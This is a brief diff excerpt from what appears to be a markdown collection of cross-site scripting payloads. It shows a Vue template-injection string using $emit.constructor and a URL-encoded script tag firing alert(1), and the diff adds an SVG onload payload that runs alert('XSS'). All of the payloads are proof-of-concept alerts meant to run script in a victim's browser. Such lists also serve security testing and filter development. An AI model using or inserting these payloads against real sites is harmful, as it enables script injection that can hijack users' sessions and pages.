@@ -25,7 +25,10 @@ admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta
 
 ```
 i2lte%22%3e%3cscript%3ealert(1)%3c%2fscript%3eayawz
+```
 
+```
+<svg onload​='setTimeout(function() { alert("XSS"); }, 100);'>
 ```
 
 ```
